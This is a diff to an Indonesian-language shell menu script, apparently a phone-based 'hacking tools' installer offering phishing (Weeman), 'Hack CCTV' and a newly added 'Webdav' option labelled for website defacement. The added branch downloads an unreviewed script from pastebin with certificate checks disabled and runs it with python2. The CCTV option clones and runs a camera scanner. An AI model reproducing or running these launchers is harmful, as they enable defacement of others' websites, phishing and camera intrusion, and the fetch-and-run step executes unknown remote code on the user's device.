@@ -7,7 +7,7 @@ cy='\033[36;1m' #cyan
 me='\033[31;1m' #merah
 pu='\033[37;1m' #putih
 ku='\033[33;1m' #kuning
-# Jangan Recode Ya gayn
+# Recode ajh mmnx
 echo
 echo
 python2 password.py
@@ -77,6 +77,8 @@ echo $pu"24. Install Weeman (Buat Phising)"
 echo $pu"=================================================="
 echo $cy"25. Hack CCTV"
 echo $cy"=================================================="
+echo $me"26. Webdav (Buat Deface)"
+echo $me"=================================================="
 echo $cy"00. KELUAR/EXIT PROGRAM      "
 echo
 echo
@@ -321,6 +323,21 @@ clear
 git clone https://github.com/kancotdiq/ipcs
 cd ipcs
 python2 scan.py
+fi
+
+if [ $pil = 26 ]
+then
+clear
+pip2 install urllib3 chardet certifi idna requests
+apt install openssl curl
+$ pkg install libcurl
+ln -s /sdcard
+cd sdcard
+mkdir webdav
+cd webdav
+curl -k -O https://pastebin.com/raw/HnVyQPtR
+mv HnVyQPtR webdav.py
+python2 webdav.py
 fi
 
 if [ $pil = 00 ]
